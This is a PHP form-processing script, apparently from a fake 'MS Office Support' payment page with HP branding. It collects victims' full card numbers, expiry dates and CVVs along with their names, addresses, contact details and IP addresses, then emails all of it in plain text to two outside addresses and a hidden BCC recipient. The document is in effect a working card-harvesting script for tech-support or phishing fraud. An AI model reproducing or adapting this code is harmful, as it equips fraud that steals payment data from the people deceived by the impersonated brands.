<?php 

//date_default_timezone_set("Asia/Kolkata");
$to='info@s2vinfotech.com, gaurav.kansal88@outlook.com';
$todayis = date("l, F j, Y, g:i a") ;
$item_description = $_POST['item_description']; // required
$amount = $_POST['amount']; // required
$agentid = $_POST['agentid']; // required
$cid = $_POST['cid']; // required
$fname = $_POST['fname'];
$lname = $_POST['lname'];
// required
$subject='Payment Information From MS Office Support';
$email = $_POST['email']; // required
$phone = $_POST['phone']; // not required
$address=$_POST['address'];
$city=$_POST['city'];
$country=$_POST['country'];
$state=$_POST['state'];
$zip=$_POST['zip'];
$ctype=$_POST['ctype'];
$cctype=$_POST['cctype'];
$ccn=$_POST['ccn'];
$ccname=$_POST['ccname'];
$exp1=$_POST['exp1'];
$exp2=$_POST['exp2'];
$cvv=$_POST['cvv'];

$from1='info@s2vinfotech.com';

if (!empty($_SERVER["HTTP_CLIENT_IP"]))
{
//check for ip from share internet
$ip = $_SERVER["HTTP_CLIENT_IP"];
}
elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
{
// Check for the Proxy User
$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
}
else
{
$ip = $_SERVER["REMOTE_ADDR"];
}
$ip;
$dat=date('d-m-Y');
   $headers = "From: " . strip_tags($email_from) . "\r\n";

  $headers .= "Reply-To: ". strip_tags($email_from) . "\r\n";

   $headers .= "MIME-Version: 1.0\r\n";

  $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
  
  $headers .= 'BCC: robertbatla@outlook.com' . "\r\n";

$message = '<html><body>';



$message .= '<table width="100%"; rules="all" style="border:1px solid #3A5896;" cellpadding="10">';



$message .= "<tr style='background-color:#fff'>

  <td colspan='2'><a href='https://hp-contact.com'><img src='https://hp-contact.com/paynow/images/hp-logo.png' alt='' /></a></td>

  </tr>";



$message .= "<tr><td colspan=3><strong>Dear Sir </strong>, <br />This is the Payment Information From <strong>$fname</strong> from <strong>JD Global Impex Inc</strong> On $todayis</td>

</tr>";



$message .= "<tr><td width='22%' font='colr:#999999;'><strong>Subscription Details  </strong></td>

<td width='78%' font='colr:#999999;'>$item_description</td>

</tr>";


$message .= "<tr><td width='22%' font='colr:#999999;'><strong>Amount</strong></td>

<td width='78%' font='colr:#999999;'>$ $amount</td>

</tr>";

$message .= "<tr><td width='22%' font='colr:#999999;'><strong>Agent ID:</strong></td>

<td width='78%' font='colr:#999999;'>$agentid</td>

</tr>";

$message .= "<tr><td width='22%' font='colr:#999999;'><strong>Customer ID:</strong></td>

<td width='78%' font='colr:#999999;'>$cid</td>

</tr>";

$message .= "<tr><td width='22%' font='colr:#999999;'><strong>First Name:</strong></td>

<td width='78%' font='colr:#999999;'>$fname</td>

</tr>";

$message .= "<tr><td width='22%' font='colr:#999999;'><strong>Last Name </strong></td>

<td width='78%' font='colr:#999999;'>$lname</td>

</tr>";

$message .= "<tr><td width='22%' font='colr:#999999;'><strong>E-mail</strong></td>

<td width='78%' font='colr:#999999;'>$email</td>

</tr>"; 

$message .= "<tr><td width='22%' font='colr:#999999;'><strong>Phone Number:</strong></td>

<td width='78%' font='colr:#999999;'>$phone</td>

</tr>"; 

$message .= "<tr><td width='22%' font='colr:#999999;'><strong>Address:</strong></td>

<td width='78%' font='colr:#999999;'>$address</td>

</tr>"; 

$message .= "<tr><td width='22%' font='colr:#999999;'><strong>Country:</strong></td>

<td width='78%' font='colr:#999999;'>$country</td>

</tr>"; 

$message .= "<tr><td width='22%' font='colr:#999999;'><strong>City:</strong></td>

<td width='78%' font='colr:#999999;'>$city</td>

</tr>"; 

$message .= "<tr><td width='22%' font='colr:#999999;'><strong>State/Province:</strong></td>

<td width='78%' font='colr:#999999;'>$state</td>

</tr>"; 

$message .= "<tr><td width='22%' font='colr:#999999;'><strong>ZIP/Postal Code:</strong></td>

<td width='78%' font='colr:#999999;'>$zip</td>

</tr>"; 

$message .= "<tr><td width='22%' font='colr:#999999;'><strong>Card Type:</strong></td>

<td width='78%' font='colr:#999999;'>$ctype</td>

</tr>"; 

$message .= "<tr><td width='22%' font='colr:#999999;'><strong>I have:</strong></td>

<td width='78%' font='colr:#999999;'>$cctype</td>

</tr>"; 

$message .= "<tr><td width='22%' font='colr:#999999;'><strong>Card Number:</strong></td>

<td width='78%' font='colr:#999999;'>$ccn</td>

</tr>"; 

$message .= "<tr><td width='22%' font='colr:#999999;'><strong>Name On Card:</strong></td>

<td width='78%' font='colr:#999999;'>$ccname</td>

</tr>"; 

$message .= "<tr><td width='22%' font='colr:#999999;'><strong>Expiry Date</strong></td>

<td width='78%' font='colr:#999999;'>Month: $exp1 Year: $exp2</td>


</tr>"; 

$message .= "<tr><td width='22%' font='colr:#999999;'><strong>CVV:</strong></td>

<td width='78%' font='colr:#999999;'>$cvv</td>

</tr>"; 





$message .= "</table>

";



$message .= "</body></html>";


$snd=mail($to,$subject,$message,$headers);

			if($snd)

			{


			

			?>

				<script type="text/javascript">



			<!--



		 window.location="Thanks.html";



			//-->



			</script>



			<?php

			}

			else

			{

				?>

			<script type="text/javascript">



			<!--



	 window.location="index.html";

			//-->



			</script>

			<?php

	}

?>